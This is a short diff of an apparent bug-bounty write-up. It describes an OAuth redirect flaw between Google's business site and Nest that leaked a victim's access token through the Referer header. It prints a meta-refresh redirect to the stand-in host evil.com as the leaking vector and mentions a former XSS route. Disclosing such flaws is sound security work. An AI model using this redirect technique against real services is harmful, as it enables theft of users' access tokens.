@@ -56,7 +56,7 @@ if you ever hunted in business.google.com then you have seen that they got an op
 which has an evil redirecting, 
 </br>
 II: victim login to try to give the authirzation to google and click accept after log in to his nest account. </br>
-III: google authorization app was not checking the redirecting hence the victim's access token was leaking in referrer.
+III: google authorization app was not checking the redirecting hence the victim's access token was leaking in referer.
  the redireting was coming back through <xmp><meta http-equiv="refresh" content="0;URL='evil.com'" />   </xmp>
  you'd have been able to XSS the matter before few years ago, as most browsers now refusing to refresh to a javascript: URL.</br>
 <img src=https://i.imgur.com/urzAIDu.png height=200 width=200></br>
